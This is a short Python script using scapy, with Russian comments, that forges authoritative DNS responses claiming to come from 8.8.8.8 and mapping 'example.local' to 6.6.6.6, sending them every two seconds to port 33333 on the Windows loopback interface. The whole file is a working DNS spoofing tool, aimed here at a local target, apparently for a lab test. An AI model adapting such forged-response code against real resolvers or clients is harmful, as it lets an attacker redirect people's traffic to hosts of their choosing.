from scapy.all import *
import time

# Настройки
target_domain = "example.local"
spoofed_ip = "6.6.6.6"

def send_fake_dns():
    dns_response = (
        IP(dst="127.0.0.1", src="8.8.8.8") /
        UDP(dport=33333, sport=53) /
        DNS(
            id=0xAAAA,
            qr=1, aa=1, qd=DNSQR(qname=target_domain),
            an=DNSRR(rrname=target_domain, ttl=60, rdata=spoofed_ip)
        )
    )
    send(dns_response, iface="\\Device\\NPF_Loopback", verbose=0)
    print(f"[!] Отправлен поддельный DNS ответ: {target_domain} -> {spoofed_ip}")

while True:
    send_fake_dns()
    time.sleep(2)
 
